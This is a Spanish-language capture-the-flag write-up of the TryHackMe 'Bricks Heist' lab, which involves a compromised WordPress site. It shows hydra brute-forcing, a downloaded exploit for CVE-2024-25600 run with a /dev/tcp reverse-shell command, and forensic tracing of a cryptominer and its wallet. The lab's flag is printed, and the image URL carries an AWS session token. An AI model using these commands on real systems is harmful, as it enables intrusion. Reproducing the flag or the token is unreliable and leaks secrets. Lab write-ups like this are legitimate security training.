---
title: "asfasf"
platform: "HTB"
publishedAt: 2025-05-29
cover: "/images/ctf/fwffwf.webp"
---

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/5e19dbac-6f69-4b8e-8f73-8ef638bf2a2c/70123b93-0939-4cd0-9045-f0807bf65e77/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466637HWYPP%2F20250511%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250511T034511Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEAsaCXVzLXdlc3QtMiJHMEUCIQCSlCieOfd%2F3Mn7ypc9nmeerRe4OEjN8AEzRJj95lPkFgIgMmryOtJVACIxIcvZYwax4VyiSRTfCwxMrR5XqtWayxkqiAQItP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDNLWgiGnP1GWFnfnwyrcAxH3x1um6Yp5fuQrSc7jadA2NUuy98l0PB%2FyNTjs8LPDdVRObw9gjtLrocGR0maB%2BOdc3Du3Vf5NUwhUwjFscqHgCTrDnSn%2FI75hsLxCVaDB1Y%2FOTvFMLAIUz1nCD7Shk08pJUr97hqAGILUKIgID%2BSKoC2bckJZ3Hwfy%2FoQQOMer9rlxEvgQyucuMbGzylBBOJEfNPfI96J5r1JgrxmsnQDsVyUejddexXtdIVbqaWBtCsUAPbXYAIkXLWYfN5ncvWJqRJfFpsIsfiAUX2L3bCFrswOK3p2e2%2BzBVBRxoAE%2FtJl7z2mNzxJkEvOoE7u1X0irQSrD6%2Fd0npPCREb45TT2wO0qHcVphkrq0vVxLR831VwGs8Y%2B4OuP75Jdb3ehs9mSWM6dlg37%2FWWO0IeAAe%2FDKNCXtHn6XvGEzd15sGMq4Go224O7jEPnPaWNPR0sBObPSLdEKRW17PYIzEHSDVGS5i%2BuGfBM44o%2BAeIBDON22ol1UducIjN7ku5Fzi8rzN9c0bmNFgFWLWbW%2BcTODj2Wp4JYxAE1Uu9JqrlRwbo8%2BOgb6ZyEm6HgruQkCON6so2vEyvuHctRldE5zJYMOH9MdapWXSuzyta5tPIHgrZ0DSTifgopZAAY5HIMO2cgMEGOqUBFChiiuc%2BHTyz7eh17Xw4fNQy3TIKGd0lpVhQag0Q8HmURQnGaccVP3XZPI8iBQTdIq%2Fad9zB2kj7ayx292lUkkXfqLxUzp6czKNQho%2BUZ9R5MJ5jPOyd3sT09Fu8ObUtRjoKCRtJ%2Bm%2Bv%2FeX1GJGD1rbYtevx5v3LKeZJI6tEx2%2B7u78CGe%2FO9KDhSTr%2FrgdLcccIxtd6Sw2HxnPgMQRLeqRIBFps&X-Amz-Signature=19c95a51d858f95bbaa9e90bb98440e021fa2010251a57c49f0361d66e5e4258&X-Amz-SignedHeaders=host&x-id=GetObject)


# 🧱 Bricks Heist – TryHackMe (Write-up)


[embed]()


## 🕵️ Introducción


Un sitio web WordPress fue comprometido. Nuestra misión: identificar el punto de entrada, recuperar acceso como administrador, detectar actividad maliciosa (minería), y rastrear al grupo de amenazas involucrado.


---


## 🔍 1. Escaneo inicial


```shell
bash
CopyEdit
nmap -sCV -p- 10.10.72.226
```


Servicios expuestos:

- 22: SSH
- 80: WebSockify (error 405)
- 443: WordPress 6.5
- 3306: MySQL (sin acceso)

---


## 🧱 2. Enumeración de WordPress

- Se detecta **tema activo: Bricks**
- Vulnerabilidad conocida: **CVE-2024-25600**
- Exploit público descargado desde GitHub

---


## 🔓 3. Acceso administrativo


Se obtuvo login con `administrator`, mediante fuerza bruta con `hydra`:


```shell
bash
CopyEdit
hydra -l administrator -P rockyou.txt https://bricks.thm -s 443 -S -f \
  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:S=Location: /wp-admin/"
```


---


## 💣 4. Exploiting CVE-2024-25600


Se usó el script:


```shell
bash
CopyEdit
wget https://raw.githubusercontent.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/main/CVE-2024-25600.py
```


Ejemplo:


```shell
bash
CopyEdit
python3 CVE-2024-25600.py \
  --url https://bricks.thm \
  --username administrator \
  --password TU_PASS \
  --cmd "bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'"
```


Se obtuvo **shell interactiva**.


---


## 🐚 5. Post-explotación


### Flag encontrada:


```plain text
css
CopyEdit
/var/www/html/650c844110baced87e1606453b93f22a.txt
THM{fl46_650c844110baced87e1606453b93f22a}
```


---


## 🔍 6. Proceso y servicio sospechoso


### Proceso:


```plain text
pgsql
CopyEdit
nm-inet-dialog
```


### Servicio malicioso:


```plain text
CopyEdit
ubuntu.service - TRYHACK3M
```


Verificado vía:


```shell
bash
CopyEdit
systemctl status ubuntu.service
```


---


## 📄 7. Log del miner


Log activo ubicado en:


```plain text
bash
CopyEdit
/lib/NetworkManager/inet.conf
```


📌 **Respuesta (formato** **`xxxx.xxxx`****)**:


```plain text
pgsql
CopyEdit
inet.conf
```


---


## 💰 8. Wallet del miner


Del archivo `inet.conf`:


```plain text
text
CopyEdit
ID: WW1NeGNY...
```


Base64 → doble decode → wallet final:


```plain text
nginx
CopyEdit
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
```


---


## 🕵️‍♂️ 9. Threat group


Wallet está asociada con el grupo de ransomware:


**LockBit**


(Confirmado por búsquedas OSINT y análisis de blockchain)


---


## ✅ Conclusión


Este CTF fue un excelente caso realista que combinó:

- Enumeración
- Explotación de CVE
- Análisis forense de logs y procesos
- Técnicas OSINT

Una gran práctica para pentesters y analistas de amenazas.

